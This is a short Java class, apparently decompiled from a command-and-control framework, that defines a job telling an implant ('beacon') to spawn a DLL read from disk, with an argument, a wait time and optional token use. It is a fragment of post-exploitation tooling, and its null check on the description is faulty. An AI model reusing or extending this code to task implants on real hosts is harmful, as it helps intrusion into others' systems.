package beacon.jobs;

import beacon.JobSimple;
import beacon.TaskBeacon;
import common.CommonUtils;

import java.io.File;

public class DllSpawnJob extends JobSimple {
    protected String file;

    protected String arg;

    protected String desc;

    protected int waittime;

    protected boolean usetoken;

    public DllSpawnJob(TaskBeacon taskBeacon, String string1, String string2, String string3, int n, boolean bl) {
        super(taskBeacon);
        this.file = string1;
        this.arg = string2;
        this.desc = string3;
        this.waittime = n;
        this.usetoken = bl;
        if (string3 == null || string3.length() == 0)
            this.desc = CommonUtils.stripRight((new File(string1)).getName(), ".dll");
        if (string3.length() > 48)
            string3 = string3.substring(0, 48);
    }

    public boolean ignoreToken() {
        return !this.usetoken;
    }

    public String getDescription() {
        return "Tasked beacon to spawn " + this.desc;
    }

    public String getShortDescription() {
        return this.desc;
    }

    public String getDLLName() {
        return this.file;
    }

    public int getWaitTime() {
        return this.waittime;
    }

    public byte[] getArgument() {
        return CommonUtils.toBytes(this.arg + Character.MIN_VALUE);
    }

    public byte[] getDLLContent() {
        return CommonUtils.readFile(getDLLName());
    }
}
